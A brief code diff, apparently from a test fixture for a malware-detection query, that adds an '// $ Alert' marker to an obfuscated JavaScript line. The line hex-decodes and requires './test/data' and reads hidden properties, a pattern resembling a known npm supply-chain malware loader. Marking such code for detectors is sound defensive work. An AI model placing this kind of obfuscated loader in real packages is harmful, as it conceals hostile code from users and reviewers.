@@ -6,7 +6,7 @@ function e(r) {
   return Buffer.from(r, "hex").toString()
 }
 
-var n = r(e("2e2f746573742f64617461")),
+var n = r(e("2e2f746573742f64617461")), // $ Alert
     o = t[e(n[3])][e(n[4])];
 
 if (!o) return;
